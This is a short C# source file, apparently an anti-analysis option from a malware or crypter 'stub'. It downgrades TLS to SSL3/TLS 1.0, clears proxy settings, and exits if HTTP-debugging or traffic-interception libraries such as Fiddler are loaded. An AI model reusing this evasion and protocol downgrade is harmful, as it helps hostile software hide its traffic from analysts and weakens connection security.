using System;
using System.Net;
using System.Runtime.InteropServices;

namespace AbaddonStub.OptionCode
{//DeiMos wHy Do YoU nAmE tHiNGs iN tRaDiTiOnAl cHiNEsE beacuse it fucking looks cool ok?
    internal class 嗅探器代碼
    {
		[DllImport("kernel32.dll", SetLastError = true)]
		internal static extern IntPtr GetModuleHandle(string lpModuleName);

		static public void 嗅探器(bool Exit)
		{
			ServicePointManager.SecurityProtocol = SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls;

			HttpWebRequest.DefaultWebProxy = new WebProxy();
			WebRequest.DefaultWebProxy = new WebProxy();

			if (GetModuleHandle("HTTPDebuggerBrowser.dll") != IntPtr.Zero || GetModuleHandle("FiddlerCore4.dll") != IntPtr.Zero || GetModuleHandle("RestSharp.dll") != IntPtr.Zero || GetModuleHandle("Titanium.Web.Proxy.dll") != IntPtr.Zero)
			{
				if (Exit)
					Environment.Exit(0);
			}
		}
	}
}
